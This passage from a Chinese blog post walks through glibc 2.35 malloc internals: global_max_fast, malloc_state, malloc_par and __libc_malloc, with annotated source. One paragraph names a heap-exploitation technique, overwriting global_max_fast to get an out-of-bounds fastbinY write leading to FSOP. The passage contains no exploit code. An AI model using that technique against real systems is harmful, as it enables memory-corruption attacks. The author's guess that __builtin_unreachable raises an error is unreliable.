since</span></span><br><span class="line"><span class="comment">   consolidation reduces fragmentation surrounding large chunks even</span></span><br><span class="line"><span class="comment">   if trimming is not used.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD  (65536UL)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Maximum size of memory handled in fastbins.  */</span></span><br><span class="line"><span class="keyword">static</span> INTERNAL_SIZE_T global_max_fast;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Set value of max_fast.</span></span><br><span class="line"><span class="comment">   Use impossibly small value if 0.</span></span><br><span class="line"><span class="comment">   Precondition: there are no existing fastbin chunks in the main arena.</span></span><br><span class="line"><span class="comment">   Since do_check_malloc_state () checks this, we call malloc_consolidate ()</span></span><br><span class="line"><span class="comment">   before changing max_fast.  Note other arenas will leak their fast bin</span></span><br><span class="line"><span class="comment">   entries if max_fast is reduced.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//设置global_max_fast的值</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_max_fast(s) \ </span></span><br><span class="line">  global_max_fast = (((<span class="keyword">size_t</span>) (s) &lt;= MALLOC_ALIGN_MASK - SIZE_SZ)\</span><br><span class="line">                     ? MIN_CHUNK_SIZE / <span class="number">2</span> : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> INTERNAL_SIZE_T</span><br><span class="line">get_max_fast (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Tell the GCC optimizers that global_max_fast is never larger</span></span><br><span class="line"><span class="comment">     than MAX_FAST_SIZE.  This avoids out-of-bounds array accesses in</span></span><br><span class="line"><span class="comment">     _int_malloc after constant propagation of the size parameter.</span></span><br><span class="line"><span class="comment">     (The code never executes because malloc preserves the</span></span><br><span class="line"><span class="comment">     global_max_fast invariant, but the optimizers may not recognize</span></span><br><span class="line"><span class="comment">     this.)  */</span></span><br><span class="line">  <span class="keyword">if</span> (global_max_fast &gt; MAX_FAST_SIZE)</span><br><span class="line">    __builtin_unreachable ();</span><br><span class="line">  <span class="keyword">return</span> global_max_fast;</span><br><span class="line">&#125;<span class="comment">//取global_max_fast</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个<code>global_max_fast</code>如果我们能泄露出libc就能根据偏移找到其位置。有些利用方式就是修改这个值，然后实现fastbinY数组越界写，让某个地方写上一个可控堆地址，进而利用(比如进行FSOP之类的)。</p><p>但是在glibc2.35(或者之前就有？至少glibc2.27是没有特判的)似乎进行了一些判断，从这个<code>get_max_fast</code>就可以看出，如果<code>global_max_fast</code>过大将调用<code>__builtin_unreachable</code>(这大概率是个抛出错误什么的)，而不是返回<code>global_max_fast</code></p><h5 id="malloc-state-与-malloc-par"><a href="#malloc-state-与-malloc-par" class="headerlink" title="malloc_state 与 malloc_par"></a>malloc_state 与 malloc_par</h5><p>这两个比较相似，我们首先说<code>malloc_state</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">    <span class="comment">//锁结构，保持数据一致性</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="keyword">int</span> have_fastchunks;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">    <span class="comment">//fastbinsY数组，存放fastbin</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">    <span class="comment">//top chunk</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  <span class="comment">//bins数组</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="comment">//binmap，实现快速检索哪个bins有free chunk</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="comment">//多线程环境中可能有其他malloc_state，每个之间用next相连形成链表结构</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="comment">//应该是使用这个arena的线程数</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>通过对结构体成员的大致浏览也不难得出，这个结构体是一个类似管理员的角色，统一管理bins等结构。最为我们所熟知的是<code>main_arena</code>，他管理着主线程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> <span class="title">main_arena</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  .mutex = _LIBC_LOCK_INITIALIZER,</span><br><span class="line">  .next = &amp;main_arena,</span><br><span class="line">  .attached_threads = <span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>还有一个类似的结构体叫做<code>malloc_par</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_par</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Tunable parameters */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> trim_threshold;</span><br><span class="line">  INTERNAL_SIZE_T top_pad;</span><br><span class="line">  INTERNAL_SIZE_T mmap_threshold;</span><br><span class="line">  INTERNAL_SIZE_T arena_test;</span><br><span class="line">  INTERNAL_SIZE_T arena_max;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> HAVE_TUNABLES</span></span><br><span class="line">  <span class="comment">/* Transparent Large Page support.  */</span></span><br><span class="line">  INTERNAL_SIZE_T thp_pagesize;</span><br><span class="line">  <span class="comment">/* A value different than 0 means to align mmap allocation to hp_pagesize</span></span><br><span class="line"><span class="comment">     add hp_flags on flags.  */</span></span><br><span class="line">  INTERNAL_SIZE_T hp_pagesize;</span><br><span class="line">  <span class="keyword">int</span> hp_flags;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory map support */</span></span><br><span class="line">  <span class="keyword">int</span> n_mmaps;</span><br><span class="line">  <span class="keyword">int</span> n_mmaps_max;</span><br><span class="line">  <span class="keyword">int</span> max_n_mmaps;</span><br><span class="line">  <span class="comment">/* the mmap_threshold is dynamic, until the user sets</span></span><br><span class="line"><span class="comment">     it manually, at which point we need to disable any</span></span><br><span class="line"><span class="comment">     dynamic behavior. */</span></span><br><span class="line">  <span class="keyword">int</span> no_dyn_threshold;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Statistics */</span></span><br><span class="line">  INTERNAL_SIZE_T mmapped_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_mmapped_mem;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First address handed out by MORECORE/sbrk.  */</span></span><br><span class="line">  <span class="keyword">char</span> *sbrk_base;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* Maximum number of buckets to use.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tcache_bins;</span><br><span class="line">  <span class="keyword">size_t</span> tcache_max_bytes;</span><br><span class="line">  <span class="comment">/* Maximum number of chunks in each bucket.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tcache_count;</span><br><span class="line">  <span class="comment">/* Maximum number of chunks to remove from the unsorted list, which</span></span><br><span class="line"><span class="comment">     aren&#x27;t used to prefill the cache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tcache_unsorted_limit;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>同样有一个类似于<code>main_arena</code>的角色，叫做<code>mp_</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_par</span> <span class="title">mp_</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  .top_pad = DEFAULT_TOP_PAD,</span><br><span class="line">  .n_mmaps_max = DEFAULT_MMAP_MAX,</span><br><span class="line">  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,</span><br><span class="line">  .trim_threshold = DEFAULT_TRIM_THRESHOLD,</span><br><span class="line">#define NARENAS_FROM_NCORES(n) ((n) * (<span class="keyword">sizeof</span> (<span class="keyword">long</span>) == <span class="number">4</span> ? <span class="number">2</span> : <span class="number">8</span>))</span><br><span class="line">  .arena_test = NARENAS_FROM_NCORES (<span class="number">1</span>)</span><br><span class="line">#<span class="keyword">if</span> USE_TCACHE</span><br><span class="line">  ,</span><br><span class="line">  .tcache_count = TCACHE_FILL_COUNT,</span><br><span class="line">  .tcache_bins = TCACHE_MAX_BINS,</span><br><span class="line">  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS<span class="number">-1</span>),</span><br><span class="line">  .tcache_unsorted_limit = <span class="number">0</span> <span class="comment">/* No limit.  */</span></span><br><span class="line">#endif</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="代码实现流程分析"><a href="#代码实现流程分析" class="headerlink" title="代码实现流程分析"></a>代码实现流程分析</h3><h4 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h4><p>我们看<code>malloc.h</code>文件，就会发现有个malloc函数的声明</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> *<span class="title">malloc</span> <span class="params">(<span class="keyword">size_t</span> __size)</span> __THROW __attribute_malloc__</span></span><br><span class="line"><span class="function">     __<span class="title">attribute_alloc_size__</span> <span class="params">((<span class="number">1</span>))</span> __wur</span>;</span><br></pre></td></tr></table></figure><p>嗯，其中的<code>__THROW __</code>、<code>attribute_malloc__</code> 以及<code>__attribute_alloc_size__ ((1))</code>、<code>__wur</code>都不认识（x</p><p>其中<code>__THROW</code>表明在C++下不抛出异常。绝大多数的C标准库函数不抛出异常。其中一个例外是使用函数指针作为参数的函数，例如qsort和bsearch。单纯C语言程序中此属性时没有作用。</p><p>其定义在misc/sys/cdefs.h中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* GCC can always grok prototypes.  For C++ programs we add throw()</span></span><br><span class="line"><span class="comment">   to help it optimize the function calls.  But this works only with</span></span><br><span class="line"><span class="comment">   gcc 2.8.x and egcs.  For gcc 3.2 and up we even mark C functions</span></span><br><span class="line"><span class="comment">   as non-throwing using a function attribute since programs can use</span></span><br><span class="line"><span class="comment">   the -fexceptions options for C code as well.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">if</span> !defined __cplusplus &amp;&amp; __GNUC_PREREQ (3, 3)</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> __THROW       __attribute__ ((__nothrow__ __LEAF))</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> __THROWNL     __attribute__ ((__nothrow__))</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> __NTH(fct)    __attribute__ ((__nothrow__ __LEAF)) fct</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">if</span> defined __cplusplus &amp;&amp; __GNUC_PREREQ (2,8)</span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> __THROW      throw ()</span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> __THROWNL    throw ()</span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> __NTH(fct)   __LEAF_ATTR fct throw ()</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> __THROW</span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> __THROWNL</span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> __NTH(fct)   fct</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>而<code>__attribute_malloc__</code>是优化malloc函数的，其定义也在misc/sys/cdefs.h中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* At some point during the gcc 2.96 development the `malloc&#x27; attribute</span></span><br><span class="line"><span class="comment">   for functions was introduced.  We don&#x27;t want to use it unconditionally</span></span><br><span class="line"><span class="comment">   (although this would be possible) since it generates warnings.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __GNUC_PREREQ (2,96)</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __attribute_malloc__ __attribute__ ((__malloc__))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __attribute_malloc__ <span class="comment">/* Ignore */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p><code>__attribute_alloc_size__</code>,定义也在那个文件当中。用于告诉编译器函数返回值指向的内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Tell the compiler which arguments to an allocation function</span></span><br><span class="line"><span class="comment">   indicate the size of the allocation.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __GNUC_PREREQ (4, 3)</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __attribute_alloc_size__(params) \</span></span><br><span class="line">  __attribute__ ((__alloc_size__ params))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __attribute_alloc_size__(params) <span class="comment">/* Ignore.  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>还有<code>__wur</code>，同样是在那个文件作用就是如果函数返回值没有被使用，则会抛出warning</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* If fortification mode, we warn about unused results of certain</span></span><br><span class="line"><span class="comment">   function calls which can lead to problems.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __GNUC_PREREQ (3,4) || __glibc_has_attribute (__warn_unused_result__)</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __attribute_warn_unused_result__ \</span></span><br><span class="line">   __attribute__ ((__warn_unused_result__))</span><br><span class="line"><span class="meta"># <span class="meta-keyword">if</span> defined __USE_FORTIFY_LEVEL &amp;&amp; __USE_FORTIFY_LEVEL &gt; 0</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> __wur __attribute_warn_unused_result__</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __attribute_warn_unused_result__ <span class="comment">/* empty */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __wur</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __wur <span class="comment">/* Ignore */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>但是分析完了我们也没有发现malloc的实现，事实上我们在malloc.c中可以发现这个语句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strong_alias (__libc_malloc, __malloc) strong_alias (__libc_malloc, <span class="built_in">malloc</span>)</span><br></pre></td></tr></table></figure><p>简单来说<code>strong_alias</code>是一个重命名的一个操作，这个宏定义也能找到，但是不是我们这里分析的重点。简而言之就是把<code>malloc</code>重命名为了<code>__libc_malloc</code>。所以这里<code>__libc_malloc</code>才是我们需要分析的目标函数</p><h5 id="libc-malloc函数"><a href="#libc-malloc函数" class="headerlink" title="__libc_malloc函数"></a>__libc_malloc函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"><span class="comment">//先不管</span></span><br><span class="line">  _Static_assert (PTRDIFF_MAX &lt;= SIZE_MAX / <span class="number">2</span>,</span><br><span class="line">                  <span class="string">&quot;PTRDIFF_MAX is not more than half of SIZE_MAX&quot;</span>);</span><br><span class="line"><span class="comment">//对全局变量__malloc_initialized进行检测，判断是否初始化，若为否则调用ptmalloc_init进行初始化</span></span><br><span class="line">  <span class="keyword">if</span> (!__malloc_initialized)</span><br><span class="line">    ptmalloc_init ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  <span class="comment">//调用checked_request2size，首先判断bytes的大小是否合理，然后调用宏request2size把用户申请的request大小转变成实际的chunk size大小，存放在tbytes中</span></span><br><span class="line">  <span class="keyword">if</span> (!checked_request2size (bytes, &amp;tbytes))</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (ENOMEM);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="comment">//把tbytes转化成对应的tcache bin的idx</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"><span class="comment">//可能需要进行Tcache 初始化</span></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = tcache_get (tc_idx);</span><br><span class="line">      <span class="keyword">return</span> tag_new_usable (victim);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = tag_new_usable (_int_malloc (&amp;main_arena, bytes));</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line">  victim = tag_new_usable (victim);</span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_malloc) <span class="comment">//libc_hidden_def的作用:标志修饰的函数在动态链接的过程中进行延迟绑定。</span></span><br></pre></td></tr></table></figure><p>首先是进行了初始化操作,<code>ptmalloc_init</code>在后面分析了一些，建议先跳转到后面看一下，然后再回来(入栈式学习x)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!__malloc_initialized)</span><br><span class="line">ptmalloc_init ();</span><br></pre></td></tr></table></figure><p>之后tbytes转化成对应的tcache bin的idx之后进行<code>MAYBE_INIT_TCACHE</code>，可能需要初始化Tcache，这个宏对应的是<code>tcache_init()</code>函数(如果没有USE_TCACHE的话就是无事发生)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAYBE_INIT_TCACHE() \</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tcache == <span class="literal">NULL</span>)) \</span><br><span class="line">    tcache_init();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span>  <span class="comment">/* !USE_TCACHE */</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAYBE_INIT_TCACHE()</span></span><br></pre></td></tr></table></figure><p>然后我们看看这个<code>tcache_init</code>函数(感觉这里应该归为下面的初始化操作),这个函数在之前介绍tcache的宏的时候说过，但是这里为了完整性还是再分析一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 